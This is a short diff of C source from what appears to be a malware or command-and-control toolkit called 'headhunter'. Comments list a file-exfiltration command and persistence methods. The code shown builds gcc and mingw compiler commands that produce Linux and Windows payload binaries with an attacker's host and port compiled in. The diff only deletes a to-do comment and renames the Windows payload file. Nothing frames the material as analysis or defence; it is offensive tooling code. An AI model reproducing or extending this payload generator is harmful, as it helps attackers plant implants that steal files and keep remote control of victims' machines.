@@ -9,7 +9,6 @@
 // Implement command session command "exfil", which allows you to exfil files.
 // Comment payload which is now far more advanced
 // Add better error handling on payload, as well is implement persistance methods
-// Update Windows payload to be similar to GNU/Linux payload
 
 #include "server.c"
 #include <stdlib.h>
@@ -142,7 +141,7 @@ int generate_payload(char* platform, char* outfile, char* port, char* lhost) {
     snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -o %s", port, lhost, outfile);
   else if(strcmp(platform, "win64") == 0)
     // x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
-    snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
+    snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
   else if(strcmp(platform, "win32") == 0)
     // i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
     snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
